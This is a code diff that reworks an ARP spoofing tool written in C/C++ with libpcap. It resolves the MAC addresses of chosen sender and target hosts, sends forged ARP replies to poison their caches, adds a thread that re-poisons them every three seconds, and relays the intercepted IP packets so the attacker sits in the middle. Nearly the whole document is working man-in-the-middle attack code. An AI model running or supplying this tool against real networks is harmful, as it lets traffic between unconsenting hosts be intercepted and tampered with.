@@ -1,13 +1,19 @@
 #include <pcap.h>
 #include <stdio.h>
 #include <stdlib.h>
+#include <unistd.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
 #include <sys/ioctl.h>
 #include <net/if.h>
 #include <string.h>
+#include <pthread.h>
+#include <utility>
+#include <list>
+#include <map>
 
+using namespace std;
 
 #define ETHER_ADDR_LEN	6
 #define IP_ADDR_LEN 4
@@ -52,9 +58,14 @@ void usage() {
   printf("sample: arp_spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
 }
 
+struct Mac{
+	uint8_t addr[ETHER_ADDR_LEN]={0};
+};
+
+list<pair<in_addr, in_addr>> sessions;
 struct in_addr my_ip;
 uint8_t my_mac[6], my_ArpPacket[ETHERNET_SIZE+E_IP_ARP_SIZE];
-uint8_t* sender_macs, *target_macs;
+map<uint32_t, Mac> sender_macs, target_macs;
 struct in_addr *sender_ips, *target_ips;
 
 int get_myinfo()
@@ -97,7 +108,7 @@ int get_myinfo()
     }
 
     if (success){
-	    memcpy(my_mac, ifr.ifr_hwaddr.sa_data, 6);
+	    memcpy(my_mac, ifr.ifr_hwaddr.sa_data, ETHER_ADDR_LEN);
 	    ioctl(sock, SIOCGIFADDR, &ifr);
 	    my_ip =  ((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr;
 	    printf("Attacker's : %s\n" ,inet_ntoa(( (struct sockaddr_in *)&ifr.ifr_addr )->sin_addr) );
@@ -106,53 +117,53 @@ int get_myinfo()
     return -1;
 }
 
-int send_arpreq(pcap_t * handle,  struct in_addr sender_ip)
+int send_arpreq(pcap_t * handle,  uint32_t sender_ip)
 {
 	struct ethernet * my_ether = (struct ethernet *)my_ArpPacket;
-  memset(my_ether->ether_dhost, 0xff, ETHER_ADDR_LEN);
+  	memset(my_ether->ether_dhost, 0xff, ETHER_ADDR_LEN);
 
-  struct ethernet_ip_arp * my_arp = (struct ethernet_ip_arp *)(my_ArpPacket + ETHERNET_SIZE);
-  my_arp->operation = htons(1);
-  memcpy(my_arp->tpa, &(sender_ip.s_addr), 4);
-  memset(my_arp->tha, 0, 6);
-  memcpy(my_arp->spa, &(my_ip.s_addr),4);
-  memcpy(my_arp->sha, my_mac, 6);
+  	struct ethernet_ip_arp * my_arp = (struct ethernet_ip_arp *)(my_ArpPacket + ETHERNET_SIZE);
+  	my_arp->operation = htons(1);
+  	memcpy(my_arp->tpa, &sender_ip, 4);
+  	memset(my_arp->tha, 0, ETHER_ADDR_LEN);
+  	memcpy(my_arp->spa, &(my_ip.s_addr),4);
+  	memcpy(my_arp->sha, my_mac, ETHER_ADDR_LEN);
 
-  if(pcap_sendpacket(handle, my_ArpPacket, ETHERNET_SIZE+E_IP_ARP_SIZE)==-1)
-  {
+  	if(pcap_sendpacket(handle, my_ArpPacket, ETHERNET_SIZE+E_IP_ARP_SIZE)==-1)
+  	{
 		printf("send errror\n");
 		return -1;
-  }
+  	}
 	return 0;
 }
 
 void init_MyArpPacket()
-	
 {
 	struct ethernet * my_ether = (struct ethernet *)my_ArpPacket;
-  my_ether->ether_type = htons(ETHERTYPE_ARP);
+  	my_ether->ether_type = htons(ETHERTYPE_ARP);
 	memcpy(my_ether->ether_shost, my_mac, ETHER_ADDR_LEN);
 
 	struct ethernet_ip_arp * my_arp = (struct ethernet_ip_arp *)(my_ArpPacket + ETHERNET_SIZE);
-	my_arp->htype = htons(1);
-  my_arp->ptype = htons(0x0800);
-  my_arp->hlen = 6;
-  my_arp->plen = 4;
+	my_arp->htype = htons(1); //ethernet
+  	my_arp->ptype = htons(0x0800);
+  	my_arp->hlen = 6;
+  	my_arp->plen = 4;
 	return;
 }
 
-int resolve_senders(pcap_t* handle, int num)
+int resolve_senders(pcap_t* handle)
 {
 	int success = 1;
 	init_MyArpPacket();
-	for(int i=0; i<num; i++)
+	for(map<uint32_t,Mac>::iterator it = sender_macs.begin(); it != sender_macs.end(); it++)
 	{
 		int tmp_success = 0;
 		while(true)
 		{
+				uint32_t tmp_ip = (*it).first;
 				struct pcap_pkthdr* header;
 				const uint8_t* packet;
-				send_arpreq(handle, sender_ips[i]);
+				if(send_arpreq(handle, tmp_ip)==-1) return -1;
 				int res = pcap_next_ex(handle, &header, &packet);
 				if (res == 0) continue;
 				if (res == -1 || res == -2) break;
@@ -161,17 +172,32 @@ int resolve_senders(pcap_t* handle, int num)
 				if(ntohs(req_ether->ether_type) != ETHERTYPE_ARP) continue;
 
 				struct ethernet_ip_arp * arp = (struct ethernet_ip_arp *)(packet + ETHERNET_SIZE);
-				if(*(uint *)(arp->spa) != sender_ips[i].s_addr || ntohs(arp->operation)!=2) continue;
+				if(*(uint *)(arp->spa) != tmp_ip || ntohs(arp->operation)!=2) continue;
 
-				memcpy(sender_macs+(i*6), arp->sha, 6);
+				memcpy(&((*it).second.addr), arp->sha, ETHER_ADDR_LEN);
+				printf("Sender's Mac : ");
+                		for(int j=0; j<6; j++) printf("%02x:", (*it).second.addr[j]);
+				printf("\n");
+
 				tmp_success = 1;
 				break;
 	 	}
+		if(!tmp_success){
+                        success=0;
+                        break;
+                }
+	}
+	
+
+	for(map<uint32_t,Mac>::iterator it = target_macs.begin(); it != target_macs.end() && success; it++)
+	{
+		int tmp_success = 0;
 		while(true)
                 {
+				uint32_t tmp_ip = (*it).first;
                                 struct pcap_pkthdr* header;
                                 const uint8_t* packet;
-                                send_arpreq(handle, target_ips[i]);
+                                if(send_arpreq(handle, tmp_ip)==-1) return -1;
                                 int res = pcap_next_ex(handle, &header, &packet);
                                 if (res == 0) continue;
                                 if (res == -1 || res == -2) break;
@@ -180,10 +206,13 @@ int resolve_senders(pcap_t* handle, int num)
                                 if(ntohs(req_ether->ether_type) != ETHERTYPE_ARP) continue;
 
                                 struct ethernet_ip_arp * arp = (struct ethernet_ip_arp *)(packet + ETHERNET_SIZE);
-                                if(*(uint *)(arp->spa) != target_ips[i].s_addr || ntohs(arp->operation)!=2) continue;
+                                if(*(uint *)(arp->spa) != tmp_ip || ntohs(arp->operation)!=2) continue;
 
-                                memcpy(target_macs+(i*6), arp->sha, 6);
-                                tmp_success = 1;
+                                memcpy(&((*it).second.addr), arp->sha, ETHER_ADDR_LEN);
+                                printf("Target's Mac : ");
+                                for(int j=0; j<6; j++) printf("%02x:", (*it).second.addr[j]);
+                                printf("\n");
+				tmp_success = 1;
                                 break;
                 }
 		if(!tmp_success){
@@ -191,29 +220,21 @@ int resolve_senders(pcap_t* handle, int num)
 			break;
 		}
 	}
+
 	if(!success){
 		printf("can't resolve sender's mac\n");
 		return -1;
 	}
-
-	for(int i=0; i<num; i++)
-	{
-		printf("[%d]Sender's Mac : ", i+1);
-		for(int j=0; j<6; j++) printf("%02x:", *(sender_macs+i*6+j));
-		printf("\n[%d]Target's Mac : ", i+1);
-                for(int j=0; j<6; j++) printf("%02x:", *(target_macs+i*6+j));
-		
-		printf("\n");
-	}
+	
 
 	return 0;
 }
 
-void try_relay(pcap_t* handle, struct ethernet *req_ether, uint32_t len, int num)
+void try_relay(pcap_t* handle, struct ethernet *req_ether, uint32_t len, uint32_t target_ip)
 {
 	if(!memcmp(req_ether->ether_dhost, my_mac, ETHER_ADDR_LEN)){
 		memcpy(req_ether->ether_shost, my_mac, ETHER_ADDR_LEN);
-		memcpy(req_ether->ether_dhost, target_macs+6*num, ETHER_ADDR_LEN);
+		memcpy(req_ether->ether_dhost, target_macs[target_ip].addr, ETHER_ADDR_LEN);
 		if(pcap_sendpacket(handle, (const u_char*)req_ether, len)==-1){
 				printf("send errrrrrrrrrrr\n");
 				return;
@@ -222,13 +243,15 @@ void try_relay(pcap_t* handle, struct ethernet *req_ether, uint32_t len, int num
 	}
 }
 
-int arp_attack(pcap_t* handle, struct in_addr sip, struct in_addr tip, uint8_t * s_mac)
+int arp_attack(pcap_t* handle, struct in_addr sip, struct in_addr tip, Mac s_mac)
 {
 	struct ethernet * my_ether = (struct ethernet *)my_ArpPacket;
 	struct ethernet_ip_arp * my_arp = (struct ethernet_ip_arp *)(my_ArpPacket+ETHERNET_SIZE);
-	memcpy(my_ether->ether_dhost, s_mac, ETHER_ADDR_LEN);
+	memcpy(my_ether->ether_dhost, s_mac.addr, ETHER_ADDR_LEN);
+	
+	my_arp->operation = htons(2);
 	memcpy(my_arp->tpa, &(sip.s_addr), 4);
-  	memcpy(my_arp->tha, s_mac, ETHER_ADDR_LEN);
+  	memcpy(my_arp->tha, s_mac.addr, ETHER_ADDR_LEN);
   	memcpy(my_arp->spa, &(tip.s_addr),4);
 	memcpy(my_arp->sha, my_mac, ETHER_ADDR_LEN);
 
@@ -240,6 +263,17 @@ int arp_attack(pcap_t* handle, struct in_addr sip, struct in_addr tip, uint8_t *
 	return 0;
 }
 
+void * periodic_arp_attack(void * handle){
+	
+	while(true){
+		list<pair<in_addr, in_addr>>::iterator it = sessions.begin();
+        	for(; it != sessions.end(); it++){
+                	arp_attack((pcap_t*)handle , (*it).first, (*it).second, sender_macs[(*it).first.s_addr]);
+        	}
+		sleep(3);
+	}	
+}
+
 int main(int argc, char* argv[])
 {
 	if (argc < 4 || argc%2 == 1)
@@ -247,43 +281,50 @@ int main(int argc, char* argv[])
 		usage();
 		return -1;
 	}
+	
 	int session_num = (argc-2)/2;
 	char* dev = argv[1];
-	sender_ips = (struct in_addr *)malloc((sizeof(struct in_addr))*session_num);
-	target_ips = (struct in_addr *)malloc((sizeof(struct in_addr))*session_num);
-	sender_macs = (uint8_t *)malloc(6*session_num);
-	target_macs = (uint8_t *)malloc(6*session_num);
-  for(int i=0; i < session_num; i++)
-  {
-		inet_pton(AF_INET, argv[2*i+2], &sender_ips[i]);
-		inet_pton(AF_INET, argv[2*i+3], &target_ips[i]);
-  }
+	pthread_t tid;
 
-  if(!get_myinfo())
-  {
+		
+	for(int i=0; i < session_num; i++)
+  	{
+		struct in_addr sender_ip, target_ip;
+		inet_pton(AF_INET, argv[2*i+2], &sender_ip);
+		inet_pton(AF_INET, argv[2*i+3], &target_ip);
+		sessions.push_back(make_pair(sender_ip, target_ip));
+
+		sender_macs[sender_ip.s_addr] = Mac();
+		target_macs[target_ip.s_addr] = Mac();
+ 	 }
+	
+  	if(!get_myinfo())//set my_mac and my_ip
+	{
 		printf("Attacker's Mac : ");
 	 	for(int i=0; i<6; i++) printf("%02x:", my_mac[i]);
 	  	printf("\n");
-  }
+  	}
 
-  char errbuf[PCAP_ERRBUF_SIZE];
-  pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
-  if (handle == NULL) {
+  	char errbuf[PCAP_ERRBUF_SIZE];
+  	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
+  	if (handle == NULL) {
     		fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
     		return -1;
  	}
+	
+  	if(resolve_senders(handle) == -1) return -1;
+	
+	list<pair<in_addr, in_addr>>::iterator it = sessions.begin();
+        for(; it != sessions.end(); it++){
+                arp_attack(handle , (*it).first, (*it).second, sender_macs[(*it).first.s_addr]);
+        }
 
-  if(resolve_senders(handle, session_num) == -1) return -1;
-
-	struct ethernet_ip_arp * my_arp = (struct ethernet_ip_arp *)(my_ArpPacket+ETHERNET_SIZE);
-  my_arp->operation = htons(2);
-	memcpy(my_arp->sha, my_mac, ETHER_ADDR_LEN);
-	for(int i=0; i< session_num; i++) arp_attack(handle, sender_ips[i], target_ips[i], sender_macs+6*i);
-
-  uint16_t type_arp, type_ip, operation_chk;
+  	uint16_t type_arp, type_ip, operation_chk;
 	type_arp = htons((uint16_t)ETHERTYPE_ARP);
 	type_ip = htons((uint16_t)ETHERTYPE_IPV4);
 	operation_chk = htons((uint16_t)1);
+
+	pthread_create(&tid, NULL, periodic_arp_attack, (void*)handle);
 
 	while (true)
 	{
@@ -299,17 +340,25 @@ int main(int argc, char* argv[])
 		if((req_ether->ether_type)==type_ip) 
 		{
 			struct sniff_ip * req_ip = (struct sniff_ip *)(packet + ETHERNET_SIZE);
-			for(int i=0; i<session_num; i++)
+			for(; it != sessions.end(); it++)
 			{
-				if(req_ip->ip_src.s_addr == sender_ips[i].s_addr && (req_ip->ip_dst.s_addr != my_ip.s_addr)) try_relay(handle,  (struct ethernet *)packet, header->len, i);
+				struct in_addr sender_ip, target_ip;
+				sender_ip.s_addr = (*it).first.s_addr;
+				target_ip.s_addr = (*it).second.s_addr;
+				uint32_t relay_length = ntohs(req_ip->ip_len) + ETHERNET_SIZE;	
+				if((req_ip->ip_src.s_addr == sender_ip.s_addr) && (req_ip->ip_dst.s_addr == target_ip.s_addr)) try_relay(handle,  (struct ethernet *)packet, relay_length, target_ip.s_addr);
 			}
 		}
 		else if((req_ether->ether_type)==type_arp)
 		{
-			for(int i=0; i<session_num; i++){
-				if( (((struct in_addr *)(req_arp->tpa))->s_addr == target_ips[i].s_addr) || (((struct in_addr *)(req_arp->spa))->s_addr == target_ips[i].s_addr)){
+			for(; it != sessions.end(); it++){
+				struct in_addr sender_ip, target_ip;
+                                sender_ip.s_addr = (*it).first.s_addr;
+                                target_ip.s_addr = (*it).second.s_addr;
 
-					if(arp_attack(handle, sender_ips[i], target_ips[i], sender_macs+6*i)) return -1;
+				if(((((struct in_addr *)(req_arp->tpa))->s_addr == target_ip.s_addr) && (((struct in_addr *)(req_arp->spa))->s_addr == sender_ip.s_addr)) || ((((struct in_addr *)(req_arp->tpa))->s_addr == sender_ip.s_addr) && (((struct in_addr *)(req_arp->spa))->s_addr == target_ip.s_addr))){
+
+					if(arp_attack(handle, sender_ip, target_ip, sender_macs[sender_ip.s_addr])) return -1;
 					printf("send arp attack!!!!!\n");
 				}
 			}
